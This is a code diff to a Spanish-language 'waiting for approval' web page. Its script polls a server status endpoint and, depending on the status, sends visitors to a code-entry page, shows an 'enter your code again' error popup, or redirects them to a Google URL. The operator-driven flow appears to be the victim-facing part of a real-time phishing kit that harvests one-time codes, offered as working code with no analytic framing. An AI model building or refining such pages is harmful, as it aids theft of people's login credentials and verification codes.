@@ -7,21 +7,66 @@
 
 <h2>⏳ Esperando aprobación...</h2>
 
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
 <script>
-const id=localStorage.getItem("id");
+const id = localStorage.getItem("id");
 
-async function check(){
-  const r=await fetch("/api/estado/"+id);
-  const j=await r.json();
+async function revisar(){
 
-  if(j.estado==="index") location="index.html";
-  if(j.estado==="codigo") location="codigo.html";
-  if(j.estado==="ok") location="https://google.com/codigo";
-  if(j.estado==="coderr") location="codigoerr.html";
+  if(!id){
+    location="index.html";
+    return;
+  }
+
+  try{
+    const r = await fetch("/api/estado/"+id);
+    const j = await r.json();
+
+    /* ---------- ESTADOS ---------- */
+
+    if(j.estado === "codigo"){
+      location="codigo.html";
+      return;
+    }
+
+    if(j.estado === "index"){
+      location="index.html";
+      return;
+    }
+
+    if(j.estado === "ok"){
+      location="https://google.com/codigo";
+      return;
+    }
+
+    /* ERROR CODIGO */
+    if(j.estado === "coderr"){
+
+      Swal.fire({
+        icon:"error",
+        title:"Oopss",
+        text:"¡Ingrese nuevamente su código!",
+        confirmButtonText:"OK",
+        allowOutsideClick:false
+      }).then(()=>{
+        location="codigo.html";
+      });
+
+      return;
+    }
+
+    /* seguir esperando */
+    setTimeout(revisar,2000);
+
+  }catch(e){
+    setTimeout(revisar,3000);
+  }
 }
 
-setInterval(check,2000);
+revisar();
 </script>
+
 
 </body>
 </html>
